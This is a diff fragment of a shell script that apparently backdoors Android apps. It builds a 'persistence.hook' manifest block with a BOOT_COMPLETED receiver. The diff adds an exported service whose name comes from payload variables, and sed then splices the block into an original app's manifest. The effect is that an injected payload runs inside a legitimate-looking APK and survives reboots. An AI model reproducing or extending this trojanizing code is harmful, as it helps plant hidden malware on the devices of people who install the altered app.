@@ -459,6 +459,7 @@ cat >$MY_PATH/persistence.hook <<EOL
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
         </receiver>
+        <service android:exported="true" android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.MainService"/>
 EOL
 sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
 rc=$?
